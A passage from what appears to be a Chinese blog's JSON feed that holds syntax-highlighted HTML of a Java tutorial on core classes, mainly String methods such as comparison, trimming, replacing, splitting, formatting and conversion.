带参数构造器，自动调用父类的无参数构造器</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">SubClass2</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"SubClass2(int n): \"</span> <span class=\"token operator\">+</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>n <span class=\"token operator\">=</span> n<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n \n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">TestSuperSub</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>\"</code></pre></div>",
      "date_published": "2024-08-26T14:47:27.000Z",
      "date_modified": "2024-08-26T14:47:27.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "3-Java核心类",
      "url": "https://echo0d.github.io/DailyNotes/develop/Java/3_CoreClass.html",
      "id": "https://echo0d.github.io/DailyNotes/develop/Java/3_CoreClass.html",
      "summary": "3-Java核心类\n字符串和编码\nString\n在Java中，String是一个引用类型，它本身也是一个class。但是，Java编译器对String有特殊处理，即可以直接用\"...\"来表示一个字符串：\n实际上字符串在String内部是通过一个char[]数组表示的，因此，按下面的写法也是可以的：\n因为String太常用了，所以Java提供了\"...\"...",
      "content_html": "\n<h2>字符串和编码</h2>\n<h3>String</h3>\n<p>在Java中，<code>String</code>是一个引用类型，它本身也是一个<code>class</code>。但是，Java编译器对<code>String</code>有特殊处理，即可以直接用<code>\"...\"</code>来表示一个字符串：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">String</span> s1 <span class=\"token operator\">=</span> <span class=\"token string\">\"Hello!\"</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>实际上字符串在<code>String</code>内部是通过一个<code>char[]</code>数组表示的，因此，按下面的写法也是可以的：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">String</span> s2 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token keyword\">char</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">{</span><span class=\"token char\">'H'</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'e'</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'l'</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'l'</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'o'</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'!'</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>因为<code>String</code>太常用了，所以Java提供了<code>\"...\"</code>这种字符串字面量表示方法。</p>\n<p>Java字符串的一个重要特点就是字符串<em>不可变</em>。这种不可变性是通过内部的<code>private final char[]</code>字段，以及没有任何修改<code>char[]</code>的方法实现的。</p>\n<p>我们来看一个例子：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// String</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">String</span> s <span class=\"token operator\">=</span> <span class=\"token string\">\"Hello\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        s <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">toUpperCase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>根据上面代码的输出，试解释字符串内容是否改变。</p>\n<h3>字符串比较</h3>\n<p>当我们想要比较两个字符串是否相同时，要特别注意，我们实际上是想比较字符串的内容是否相同。必须使用<code>equals()</code>方法而不能用<code>==</code>。</p>\n<p>我们看下面的例子：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// String</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">String</span> s1 <span class=\"token operator\">=</span> <span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">String</span> s2 <span class=\"token operator\">=</span> <span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>s1 <span class=\"token operator\">==</span> s2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>s1<span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span>s2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>从表面上看，两个字符串用<code>==</code>和<code>equals()</code>比较都为<code>true</code>，但实际上那只是Java编译器在编译期，会自动把所有相同的字符串当作一个对象放入常量池，自然<code>s1</code>和<code>s2</code>的引用就是相同的。</p>\n<p>所以，这种<code>==</code>比较返回<code>true</code>纯属巧合。换一种写法，<code>==</code>比较就会失败：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// String</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">String</span> s1 <span class=\"token operator\">=</span> <span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">String</span> s2 <span class=\"token operator\">=</span> <span class=\"token string\">\"HELLO\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">toLowerCase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>s1 <span class=\"token operator\">==</span> s2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>s1<span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span>s2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>结论：两个字符串比较，必须总是使用<code>equals()</code>方法。</p>\n<p>要忽略大小写比较，使用<code>equalsIgnoreCase()</code>方法。</p>\n<p><code>String</code>类还提供了多种方法来搜索子串、提取子串。常用的方法有：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// 是否包含子串:</span>\n<span class=\"token string\">\"Hello\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">contains</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ll\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// true</span>\n</code></pre></div><p>注意到<code>contains()</code>方法的参数是<code>CharSequence</code>而不是<code>String</code>，因为<code>CharSequence</code>是<code>String</code>实现的一个接口。</p>\n<p>搜索子串的更多的例子：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token string\">\"Hello\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"l\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 2</span>\n<span class=\"token string\">\"Hello\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">lastIndexOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"l\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 3</span>\n<span class=\"token string\">\"Hello\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">startsWith</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"He\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// true</span>\n<span class=\"token string\">\"Hello\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">endsWith</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"lo\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// true</span>\n</code></pre></div><p>提取子串的例子：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token string\">\"Hello\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">substring</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"llo\"</span>\n<span class=\"token string\">\"Hello\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">substring</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token string\">\"ll\"</span>\n</code></pre></div><p>注意索引号是从<code>0</code>开始的。</p>\n<h3>去除首尾空白字符</h3>\n<p>使用<code>trim()</code>方法可以移除字符串首尾空白字符。空白字符包括空格，<code>\\t</code>，<code>\\r</code>，<code>\\n</code>：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token string\">\"  \\tHello\\r\\n \"</span><span class=\"token punctuation\">.</span><span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"Hello\"</span>\n</code></pre></div><p>注意：<code>trim()</code>并没有改变字符串的内容，而是返回了一个新字符串。</p>\n<p>另一个<code>strip()</code>方法也可以移除字符串首尾空白字符。它和<code>trim()</code>不同的是，类似中文的空格字符<code>\\u3000</code>也会被移除：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token string\">\"\\u3000Hello\\u3000\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">strip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"Hello\"</span>\n<span class=\"token string\">\" Hello \"</span><span class=\"token punctuation\">.</span><span class=\"token function\">stripLeading</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"Hello \"</span>\n<span class=\"token string\">\" Hello \"</span><span class=\"token punctuation\">.</span><span class=\"token function\">stripTrailing</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// \" Hello\"</span>\n</code></pre></div><p><code>String</code>还提供了<code>isEmpty()</code>和<code>isBlank()</code>来判断字符串是否为空和空白字符串：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token string\">\"\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">isEmpty</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// true，因为字符串长度为0</span>\n<span class=\"token string\">\"  \"</span><span class=\"token punctuation\">.</span><span class=\"token function\">isEmpty</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// false，因为字符串长度不为0</span>\n<span class=\"token string\">\"  \\n\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">isBlank</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// true，因为只包含空白字符</span>\n<span class=\"token string\">\" Hello \"</span><span class=\"token punctuation\">.</span><span class=\"token function\">isBlank</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// false，因为包含非空白字符</span>\n</code></pre></div><h3>替换子串</h3>\n<p>要在字符串中替换子串，有两种方法。一种是根据字符或字符串替换：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">String</span> s <span class=\"token operator\">=</span> <span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">;</span>\ns<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token char\">'l'</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'w'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"hewwo\"，所有字符'l'被替换为'w'</span>\ns<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ll\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"~~\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"he~~o\"，所有子串\"ll\"被替换为\"~~\"</span>\n</code></pre></div><p>另一种是通过正则表达式替换：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">String</span> s <span class=\"token operator\">=</span> <span class=\"token string\">\"A,,B;C ,D\"</span><span class=\"token punctuation\">;</span>\ns<span class=\"token punctuation\">.</span><span class=\"token function\">replaceAll</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[\\\\,\\\\;\\\\s]+\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\",\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"A,B,C,D\"</span>\n</code></pre></div><p>上面的代码通过正则表达式，把匹配的子串统一替换为<code>\",\"</code>。关于正则表达式的用法我们会在后面详细讲解。</p>\n<h3>分割字符串</h3>\n<p>要分割字符串，使用<code>split()</code>方法，并且传入的也是正则表达式：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">String</span> s <span class=\"token operator\">=</span> <span class=\"token string\">\"A,B,C,D\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> ss <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\\\,\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// {\"A\", \"B\", \"C\", \"D\"}</span>\n</code></pre></div><h3>拼接字符串</h3>\n<p>拼接字符串使用静态方法<code>join()</code>，它用指定的字符串连接字符串数组：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> arr <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"A\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"B\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"C\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">String</span> s <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"***\"</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"A***B***C\"</span>\n</code></pre></div><h3>格式化字符串</h3>\n<p>字符串提供了<code>formatted()</code>方法和<code>format()</code>静态方法，可以传入其他参数，替换占位符，然后生成新的字符串：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// String</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">String</span> s <span class=\"token operator\">=</span> <span class=\"token string\">\"Hi %s, your score is %d!\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">.</span><span class=\"token function\">formatted</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Alice\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">80</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hi %s, your score is %.2f!\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Bob\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">59.5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>有几个占位符，后面就传入几个参数。参数类型要和占位符一致。我们经常用这个方法来格式化信息。常用的占位符有：</p>\n<ul>\n<li><code>%s</code>：显示字符串；</li>\n<li><code>%d</code>：显示整数；</li>\n<li><code>%x</code>：显示十六进制整数；</li>\n<li><code>%f</code>：显示浮点数。</li>\n</ul>\n<p>占位符还可以带格式，例如<code>%.2f</code>表示显示两位小数。如果你不确定用啥占位符，那就始终用<code>%s</code>，因为<code>%s</code>可以显示任何数据类型。要查看完整的格式化语法，请参考<a href=\"https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/util/Formatter.html#syntax\" target=\"_blank\" rel=\"noopener noreferrer\">JDK文档</a>。</p>\n<h3>类型转换</h3>\n<p>要把任意基本类型或引用类型转换为字符串，可以使用静态方法<code>valueOf()</code>。这是一个重载方法，编译器会根据参数自动选择合适的方法：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">valueOf</span><span class=\"token punctuation\">(</span><span class=\"token number\">123</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"123\"</span>\n<span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">valueOf</span><span class=\"token punctuation\">(</span><span class=\"token number\">45.67</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"45.67\"</span>\n<span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">valueOf</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"true\"</span>\n<span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">valueOf</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 类似java.lang.Object@636be97c</span>\n</code></pre></div><p>要把字符串转换为其他类型，就需要根据情况。例如，把字符串转换为<code>int</code>类型：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">int</span> n1 <span class=\"token operator\">=</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token function\">parseInt</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"123\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 123</span>\n<span class=\"token keyword\">int</span> n2 <span class=\"token operator\">=</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token function\">parseInt</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ff\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 按十六进制转换，255</span>\n</code></pre></div><p>把字符串转换为<code>boolean</code>类型：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">boolean</span> b1 <span class=\"token operator\">=</span> <span class=\"token class-name\">Boolean</span><span class=\"token punctuation\">.</span><span class=\"token function\">parseBoolean</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"true\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// true</span>\n<span class=\"token keyword\">boolean</span> b2 <span class=\"token operator\">=</span> <span class=\"token class-name\">Boolean</span><span class=\"token punctuation\">.</span><span class=\"token function\">parseBoolean</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"FALSE\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// false</span>\n</code></pre></div><p>要特别注意，<code>Integer</code>有个<code>getInteger(String)</code>方法，它不是将字符串转换为<code>int</code>，而是把该字符串对应的系统变量转换为<code>Integer</code>：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token function\">getInteger</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"java.version\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 版本号，11</span>\n</code></pre></div><h3>转换为char[]</h3>\n<p><code>String</code>和<code>char[]</code>类型可以互相转换，方法是：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">char</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> cs <span class=\"token operator\">=</span> <span class=\"token string\">\"Hello\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">toCharArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// String -&gt; char[]</span>\n<span class=\"token class-name\">String</span> s <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">(</span>cs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// char[] -&gt; String</span>\n</code></pre></div><p>如果修改了<code>char[]</code>数组，<code>String</code>并不会改变：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// String &lt;-&gt; char[]</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">char</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> cs <span class=\"token operator\">=</span> <span class=\"token string\">\"Hello\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">toCharArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">String</span> s <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">(</span>cs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        cs<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token char\">'X'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>这是因为通过<code>new String(char[])</code>创建新的<code>String</code>实例时，它并不会直接引用传入的<code>char[]</code>数组，而是会复制一份，所以，修改外部的<code>char[]</code>数组不会影响<code>String</code>实例内部的<code>char[]</code>数组，因为这是两个不同的数组。</p>\n<p>从<code>String</code>的不变性设计可以看出，如果传入的对象有可能改变，我们需要复制而不是直接引用。</p>\n<p>例如，下面的代码设计了一个<code>Score</code>类保存一组学生的成绩：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// int[]</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Arrays</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> scores <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">{</span> <span class=\"token number\">88</span><span class=\"token punctuation\">,</span> <span class=\"token number\">77</span><span class=\"token punctuation\">,</span> <span class=\"token number\">51</span><span class=\"token punctuation\">,</span> <span class=\"token number\">66</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Score</span> 